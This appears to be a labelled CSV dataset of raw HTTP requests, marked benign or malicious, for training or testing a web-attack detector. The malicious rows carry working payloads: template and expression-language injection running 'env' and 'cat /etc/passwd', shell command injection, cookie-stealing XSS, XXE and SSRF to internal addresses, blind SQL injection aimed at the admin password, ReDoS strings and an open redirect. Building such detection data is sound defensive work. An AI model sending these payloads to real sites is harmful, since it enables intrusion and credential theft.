label,text
benign,"POST /password/reset HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/password/reset

email=marina.jensen%40nextwave.mail"
malicious,"GET /dashboard/%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27env%27).read()%7D%7D/ HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /news/local/2024-update HTTP/1.1
Host: cityline-news-daily.ai
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9
Cookie: user_prefs_b64=eyJ0aGVtZSI6InN1bW1lciIsImZvbnROYW1lIjoiUm9ib3RvIiwiZGFyayI6ZmFsc2V9
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Safari/537.36"
malicious,"POST /shop/cart/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US
Content-Length: 55

product_id=12345&quantity=10%00%0alsc%20-la%20%2Fvar%2Flog"
benign,"POST /signup/new HTTP/1.1
Host: tech-solutions-cloud.io
Content-Type: application/json
Accept: application/json
Origin: https://tech-solutions-cloud.io
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Length: 139
Connection: keep-alive

{""registration"":{""username"":""miguel.santos"",""email"":""miguel.santos@tech-solutions-cloud.io"",""password"":""CloudPass#88"",""fullName"":""Miguel Santos""}}"
malicious,"GET /search HTTP/1.1
Host: online-retail-store.biz
User-Agent: ShopBot/1.4 $(uptime)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /v2/metadata/fetch?url=https%3A%2F%2Fblog.community-game-dev-forum.org%2Fthread%2F5678 HTTP/1.1
Host: services.community-game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache"
benign,"GET /media/uploads/photos/event-2023/crowd-cheering-1200x800.jpg HTTP/1.1
Host: vibrant-events-calendar.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://vibrant-events-calendar.org/events/3742
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"POST /v2/update-profile HTTP/1.1
Host: memberportal-socialconnect.org
Authorization: Bearer 5fa1c9e2-cf86-4f14-b6a0-d8a8479e4125
Content-Type: application/json
Content-Length: 97
Idempotency-Key: aa406dc9-c74c-4367-8bdc-7beb466ea802
X-Request-ID: b5a2d2ec-89c3-443f-a1da-f5459d4c0169
X-Client-Version: 3.0.1
Accept: application/json
Connection: keep-alive

{""username"":""michael_s"",""bio"":""Outdoor enthusiast and software developer"",""socialLinks"":{""twitter"":""@mikes"",""linkedin"":""/in/michael_s""}}"
benign,"GET /api/v1/users/8392.xml HTTP/1.1
Host: user-accounts-cloud.services
Accept: application/xml
Authorization: Bearer a9f8320c-d2e4-4d9a-9d5a-efd201ca87e3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"DELETE /api/v1/chats/room-67f28e8 HTTP/1.1
Host: realtime-messenger.community-chat-services.org
Authorization: Bearer 4l0q5k1337g12hxvyr8fcjma
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br"
benign,"GET /api/v3/items/search?filter=active&utm_source=partner-site&utm_medium=affiliate HTTP/1.1
Host: api.cloud-data-services.ai
Accept: text/html
Referer: https://partner-dashboard.cloud-data-services.ai/home
User-Agent: curl/7.85.0
Connection: keep-alive"
malicious,"GET /profile/settings/<iMg sRc=x oNeRrOr=alert(document.cookie)> HTTP/1.1
Host: radiant-healthcare-web.org
User-Agent: curl/7.77.0
Accept: */*
Accept-Language: en-US
Connection: close"
benign,"GET /blog/posts?author=anna%20o%27connor&tag=health%20%26%20wellness HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Cookie: sessionid=3bf24c1e7a4d5b2a6c2f
Connection: keep-alive"
benign,"POST /account/newsletter-signup HTTP/1.1
Host: creativecanvas-studio.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml
Connection: close
Referer: https://creativecanvas-studio.net/account
X-Requested-With: XMLHttpRequest

email=anna.miller.art%40paintmail.co.uk"
benign,"POST /scripts/v1/comments/highlight.js HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/javascript
Content-Length: 41
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
X-Forwarded-For: 157.55.39.100

console.log('Comment highlight applied on load');"
malicious,"POST /api/v2/submit-comment HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/xml
Content-Type: application/xml
Content-Length: 209
Origin: https://online-retail-store.biz
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE comment [
<!ENTITY xxe_ssrf SYSTEM ""http://172.16.0.3:8081/admin"" >
]>
<comment>
  <text>&xxe_ssrf;</text>
</comment>"
benign,"DELETE /api/v1/accounts/4598 HTTP/1.1
Host: api.fin-trackers.net
Authorization: Bearer qweRty98uioPasdFghJkl
If-Match: ""a1b2c3d4""
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: media-content-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"PUT /api/profiles/20459/security HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer 7fg32xna5qs188cgugo
Origin: https://portal.cloud-data-services.ai
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Content-Length: 52

{""twoFactorAuth"": true, ""backupEmail"": ""user.backup@mailservice.net""}"
benign,"GET /resource/load?file=pdfs/terms_conditions_v2.pdf HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: application/pdf
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br"
malicious,"POST /validate/checkpattern HTTP/1.1
Host: patterncheck.syssecure-services.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/json
Accept: application/json, text/html, */*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Origin: https://patterncheck.syssecure-services.info
Sec-CH-UA: ""Chromium"";v=""88"", "" Not A;Brand"";v=""99"", ""Google Chrome"";v=""88""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Linux""
Content-Length: 189

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"GET /feed/rss.xml HTTP/1.1
Host: urban-gardening-tips.club
Accept: application/rss+xml, application/xml;q=0.9, */*;q=0.8
Accept-Encoding: br, gzip, deflate
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 urban-gardening-tips.club
Connection: close"
malicious,"POST /app/notify HTTP/1.1
Host: socialconnect-network.net
Content-Type: application/json
Accept: application/json, text/html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Origin: https://socialconnect-network.net
Cookie: SCNSESSID=ac5f9e58721c4d0b9bc316e1119d2e13

{
  ""user_id"": 77531,
  ""notification_type"": ""welcome_message"",
  ""custom_greeting"": ""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""
}"
benign,"GET /dashboard/account?cmd=view_details HTTP/1.1
Host: user-profile-services.io
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://user-profile-services.io/dashboard/home
Upgrade-Insecure-Requests: 1"
benign,"POST /log HTTP/1.1
Host: trackuser-data.cloud-metrics.ai
Origin: https://portal.cloud-metrics.ai
Content-Type: text/plain
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
Content-Length: 38

event=click&target=subscribe_button&uid=4589"
benign,"POST /feedback/form HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://online-retail-store.biz/product/23456
Content-Length: 117
Connection: keep-alive

comment=I+noticed+that+SELECT+and+UPDATE+commands+are+well+optimized+on+your+reporting+back-end+systems."
benign,"GET /search?q=wireless+keyboards HTTP/1.1
Host: gadgets-marketplace.net
X-Forwarded-For: 10.0.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /api/user/dashboard/summary?timezone=Europe%2FBerlin HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/json
App-Secret: c39f3b5c9750460ea4e18cf11f9b8a2a
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Pragma: no-cache"
benign,"GET /news/today/latest-headlines HTTP/1.1
Host: daily-updates-mobile.jp
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja-JP,ja;q=0.8,en-US;q=0.6,en;q=0.4
Accept-Encoding: gzip, deflate, br
Referer: https://daily-updates-mobile.jp/news/today
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
benign,"POST /api/v1/feedback/send HTTP/1.1
Host: fresh-food-marketplace.org
Content-Type: application/json
Content-Language: en-US
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.12xyw7J08vVR30N8FxJ
X-CSRF-Token: Njg1N2YzNDUtZTY0Ny00Mzk5LTgxMWYtNmYwZTlkYTFiNmMz

{""customerId"":""3098832"",""rating"":5,""comments"":""Great selection of organic produce and fast delivery service!"",""date"":""2024-06-04T08:12:00Z""}"
benign,"GET /blog/post/2023/07/25/wellness-tips HTTP/1.1
Host: mindful-living-journal.info
Connection: keep-alive
Accept: text/html
Cookie: user_settings_b64=eyJ2b2x1bWUiOjcsImNoZWNrZWRTZXR0aW5ncyI6dHJ1ZX0=; session_token=def456uvw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept-Language: en-US,en;q=0.7"
malicious,"GET /api/fetch_image?imageUrl=http://192.168.1.100:9000/admin/dashboard HTTP/1.1
Host: media-content.api.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Accept: image/*
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"PUT /api/user/16778/preferences/theme HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...
Cache-Control: no-store
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
Connection: keep-alive

{""theme"":""light""}"
malicious,"GET /api/v2/search/items HTTP/1.1
Host: nextgen-electronics.shop
User-Agent: curl/7.76.1
Accept: application/json
Cookie: user_token=45a9bcf11bad1234; tracking_id=lm3n' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)/*evil*/; theme=dark"
benign,"POST /profile/settings HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=xyz123abc789
Content-Length: 360
Origin: https://secure-user-portal.net

--xyz123abc789
Content-Disposition: form-data; name=""timezone""

America/New_York
--xyz123abc789
Content-Disposition: form-data; name=""language_preference""

en-US
--xyz123abc789
Content-Disposition: form-data; name=""notifications_enabled""

true
--xyz123abc789
Content-Disposition: form-data; name=""display_mode""

dark
--xyz123abc789--"
benign,"POST /oauth/token HTTP/1.1
Host: user-auth-sync.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Authorization: Basic dXNlckF1dGg6NTY3OGZzZXJ2ZXIK
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=user_sync_code_987654&client_id=userAuth&client_secret=secPass4321&redirect_uri=https%3A%2F%2Fuser-auth-sync.org%2Fapp%2Fcallback"
benign,"POST /submit/comment HTTP/1.1
Host: community.tech-talk-forums.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 215
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Referer: https://community.tech-talk-forums.net/thread/4589
Connection: close

post_author=claire_m&comment_text=%3Cfeedback%3EThank+you+for+the+detailed+explanation%21+It+helped+a+lot.%3C%2Ffeedback%3E&rating=5"
malicious,"GET /search?q=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: cloudservices-api.ai
Connection: close
Accept: text/html,application/xml;q=0.9
Accept-Language: en-US,en;q=0.6
Referer: https://cloudservices-api.ai/dashboard
User-Agent: curl/7.77.0"
benign,"GET /events/2024/concerts?location=nyc&seat=%4a%5b%6C%7d HTTP/1.1
Host: live-today-events.org
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Mobile Safari/537.36
Accept: application/json
Origin: https://live-today-events.org
Referer: https://live-today-events.org/events/2024
Connection: keep-alive"
malicious,"POST /submit/data HTTP/1.1
Host: platform.content-sync.tech
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Content-Type: application/json
X-Data-Source: http://ssrf-trigger-node.cloud-edge.net/api
Content-Length: 78
Cache-Control: no-cache

{""record_id"":12345,""description"":""sync task with normal payload"",""priority"":2}"
malicious,"POST /app/user/settings HTTP/1.1
Host: trendy-fashionshop.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Cookie: session=28fac71588e9d225734d3deb20a6bc72; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)/*!MySQLComment*/-- -; layout=grid

email=validuser%40mail.com&theme=dark"
malicious,"GET /account/profile?nickname=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /api/v2/catalog/items?filter[category]=books&filter[language]=english&sort_by=author_asc&page=7 HTTP/1.1
Host: pages-knowledge-center.net
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/json
Referer: https://pages-knowledge-center.net/home
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /sitemap_index.xml HTTP/1.1
Host: online-retail-store.biz
User-Agent: python-requests/2.28.2
Accept: application/xml
Accept-Encoding: gzip, deflate
X-Forwarded-For: 198.51.100.23
Connection: keep-alive"
malicious,"GET /session/redirect?redirect=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Accept: */*
Referer: https://api.cloud-data-services.ai/oauth/login
Connection: close"
benign,"GET /v1/permissions/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: online-retail-store.biz
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: application/json
Connection: keep-alive
Origin: https://online-retail-store.biz"
benign,"PATCH /v1/member/7723/preferences HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer 2a73ckf9mnk9ejr5
Content-Type: application/json-patch+json
Accept: application/json, */*
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0
DNT: 1
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate

[
  {""op"": ""replace"", ""path"": ""/displayTheme"", ""value"": ""dark""},
  {""op"": ""remove"", ""path"": ""/notifications/popup""}
]"
